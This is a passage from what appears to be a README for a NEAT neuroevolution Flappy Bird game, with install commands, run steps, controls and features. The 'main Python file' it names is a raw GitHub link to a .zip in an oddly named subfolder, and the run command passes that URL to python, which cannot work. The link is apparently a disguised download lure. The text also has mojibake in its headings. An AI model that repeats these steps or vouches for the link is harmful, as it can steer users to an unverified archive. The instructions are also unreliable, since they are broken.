pip install pygame
pip install neat-python
```

This step ensures you have the right tools to run the application.

### 6. **Running the Application**

Navigate to the folder you extracted. Look for the main Python file, typically named `https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip`. Open your command prompt or terminal in this folder and type:

```
python https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip
```

Press Enter. This will launch the game.

## üéÆ Using the Application

When you start the game, you‚Äôll see a Flappy Bird-like interface where the AI will attempt to navigate through pipes. You can watch how the AI learns and adapts to the obstacles. 

### Controls

While the AI plays:

- Watch the bird navigate through pipes. 
- Observe how it learns from failures and successes.
  
You do not need to control the game; the AI manages everything.

## ‚öôÔ∏è Features

- **Easy Setup:** Download and run with minimal steps.
- **Interactive Learning:** See how AI adapts in real-time.
- **Educational Value:** Learn about AI and evolutionary algorithms.
  
## ‚ùì Troubleshooting
